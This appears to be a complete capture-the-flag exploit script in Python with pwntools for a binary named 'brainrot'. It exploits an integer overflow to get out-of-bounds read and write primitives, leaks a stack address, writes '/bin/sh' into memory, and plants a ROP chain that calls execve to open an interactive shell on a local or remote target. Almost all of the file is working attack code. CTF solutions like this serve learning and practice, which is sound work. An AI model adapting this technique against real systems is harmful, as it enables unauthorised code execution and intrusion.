#!/usr/bin/env python3
from ctypes import CDLL
from subprocess import Popen, PIPE
from pwncli import *
import sys
from os import path
# =========================================================
#                          SETUP                         
# =========================================================
exe = path.join(path.dirname(__file__) or '.', 'brainrot')
context.bits = 64
context.arch = 'amd64'
try: elf = context.binary = ELF(exe, checksec=False)
except: elf = type('S',(),{'address':0})()
try: libc = elf.libc
except: libc = type('S',(),{'address':0})()
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]


gdbscript = '''
init-pwndbg
# b main.check_income
b *main+105
c
'''.format(**locals())

is_ipv4 = lambda s: len(s.split('.')) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in s.split('.'))
is_domain = lambda s: all(part.isalnum() or part == '-' for part in s.split('.'))
is_port = lambda s: s.isdigit() and 0 <= int(s) <= 65535
use_ip = lambda: len(sys.argv) >= 3 and (is_ipv4(sys.argv[1]) or is_domain(sys.argv[1])) and is_port(sys.argv[2])

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        host, port = ("localhost", 5000) if len(sys.argv) < 4 else (sys.argv[2], int(sys.argv[3]))
        return remote(host, port, ssl=False)
    elif use_ip():
        context.log_level = 'info'
        host, port = str(sys.argv[1]), int(sys.argv[2])
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv)

def execute(cmds, verbose=False):
    cmds = cmds if isinstance(cmds, list) else cmds.split()
    if verbose:
        sys.stdout.write("\n")
        sys.stdout.flush()
        p = Popen(cmds, stdout=PIPE, stderr=sys.stdout, text=True, bufsize=1)
        buf = []
        for line in p.stdout:
            sys.stdout.write(line)   # live output (colors intact)
            sys.stdout.flush()
            buf.append(line)         # keep copy
        p.wait()
        return "".join(buf)
    else:
        p = Popen(cmds, stdout=PIPE, stderr=PIPE, text=True)
        out, err = p.communicate()
        return out if out else err


def open_split_tmux(cmd):
    cmd = cmd.split() if isinstance(cmd, str) else cmd
    execute(["tmux", "splitw", "-h", "-p", "65"] + cmd)

def debug():
    global gdbscript, pid
    if ((not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB)) and not use_ip():
        if args.QEMU:
            open_split_tmux(["gdb"] + [a for c in filter(None, gdbscript.strip().splitlines()) for a in ["-ex", c.strip()]])
        elif args.DOCKER:
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe=exe)
        else:
            attach(io, gdbscript=gdbscript)

def update_checksec():
    marker = "CHECKSEC"
    fn = sys.modules[__name__].__file__
    with open(fn, "r+", encoding="utf-8") as f:
        src = f.read()
        i = src.find(marker)
        i = src.find(marker, i + 1)
        i = src.find("\n", i)
        i = src.find("\n", i + 1)
        start = i + 1
        end = src.find("\n", start)
        if end == -1: 
            end = len(src)
        if src[start:end].strip() == "":
            output = execute("checksec --file {}".format(exe))
            commented = "".join(("# " + line + "\n") if line.strip() else "#" for line in output.splitlines())
            src = src[:start] + commented + src[end:]
            f.seek(0); f.write(src); f.truncate()

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
se      = lambda data               :str(data).encode()
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))

# =========================================================
#                         CHECKSEC
# =========================================================
#     Arch:       amd64-64-little
#     RELRO:      No RELRO
#     Stack:      Canary found
#     NX:         NX unknown - GNU_STACK missing
#     PIE:        No PIE (0x400000)
#     Stack:      Executable
#     RWX:        Has RWX segments
#     Stripped:   No

# =========================================================
#                         EXPLOITS
# =========================================================
BRAINROTS = [
    (b'Los 67', 67676767),
    (b'Chimpanzini Bananini', 1000000),
    (b'Orcalero Orcala', 100000),
    (b'Odin Din Din Dun', 10000),
    (b'Job Job Job Sahur', 1000),
    (b'John Pork', 100),
    (b'Ballerina Cappuccina', 10),
    (b'Meowl', 1),
]


def calc_index(ptr):
    offset = ptr - 0x000000c00001a000
    if offset < 0:
        offset += 0x1_0000_0000_0000_0000
    return offset // 4


def read32(ptr):
    # ptr is an absolute pointer; compute index and perform menu read
    io.sendlineafter(b'>', str(2).encode())
    io.sendlineafter(b':', str(calc_index(ptr)).encode())
    io.recvuntil(b'$')
    result = io.recvuntil(b'/')[:-1]
    try:
        return int(result)
    except:
        return 0


def read64(ptr):
    return read32(ptr) + (read32(ptr + 4) << 32)


steal_count = 0
def steal(index, name):
    # index here is the brainrot index (calculated by calc_index above when needed)
    global steal_count
    steal_count += 1
    io.sendlineafter(b'>', str(1).encode())
    io.sendlineafter(b':', str(index).encode())
    io.sendlineafter(b':', name)


def write32(ptr, value):
    current = read32(ptr)

    diff = value - current
    if diff < 0:
        diff += 0x1_0000_0000

    while True:
        # debug print
        print(f'value: {hex(value)}, current: {hex(current)}, diff: {hex(diff)}')
        if diff >= 1000000:
            steal(calc_index(ptr), b'Chimpanzini Bananini')
            diff -= 1000000
        elif diff >= 100000:
            steal(calc_index(ptr), b'Orcalero Orcala')
            diff -= 100000
        elif diff >= 10000:
            steal(calc_index(ptr), b'Odin Din Din Dun')
            diff -= 10000
        elif diff >= 1000:
            steal(calc_index(ptr), b'Job Job Job Sahur')
            diff -= 1000
        elif diff >= 100:
            steal(calc_index(ptr), b'John Pork')
            diff -= 100
        elif diff >= 10:
            steal(calc_index(ptr), b'Ballerina Cappuccina')
            diff -= 10
        elif diff >= 1:
            steal(calc_index(ptr), b'Meowl')
            diff -= 1
        elif diff == 0:
            break
        else:
            # catch-all: attempt a decrement to continue loop
            steal(calc_index(ptr), b'Meowl')
            diff -= 67676767


def write64(ptr, value):
    lo = value & 0xffffffff
    hi = (value >> 32) & 0xffffffff
    write32(ptr, lo)
    write32(ptr + 4, hi)

def ret2execve(binsh):
    pop_rcx_rsi = nsa(elf, 'pop rcx ; neg eax ; pop rsi ; ret')
    mov_edx_0 = nsa(elf, 'mov edx, 0 ; cmovae rax, rdx ; ret')

    rop = ROP(elf)
    rop.raw(pop_rcx_rsi)
    rop.raw(0)
    rop.raw(0)
    rop.raw(mov_edx_0)
    rop(rdi=binsh)
    rop.execve()
    return rop.chain()

def exploit(x):
    # James Carter's Solution
    global io
    io = initialize()
    log.info("[+] Triggering integer-overflow based OOB access")
    with log.progress("Sending large inventory size"), context.silent:
        big_count = (1 << 62) + 0x1000
        io.sendlineafter(b'How large is your inventory? ', str(big_count).encode())
        stack = read64(0xa98398)
        ret = stack - 0x50
        binsh = 0xa96bd8
        payload = ret2execve(binsh)

    log.success("Overflow triggered! OOB read/write enabled")
    leak("Leaked stack pointer", hex(stack))
    leak("Return address", hex(ret))
    with log.progress("Writing ROP chain to stack"), context.silent:
        write64(binsh, u64(b'/bin/sh\x00'))
        for i in range(0, len(payload), 8):
            if u64(payload[i:i+8]) != 0:
                write64(ret + i, u64(payload[i:i+8].ljust(8, b'\x00')))

    # debug()
    # pause()

    io.sendline(b'3')
    io.interactive()

if __name__ == '__main__':
    global io
    for i in range(1):
        try:
            exploit(i)
        except Exception as e:
            import traceback
            traceback.print_exc()
        io.close()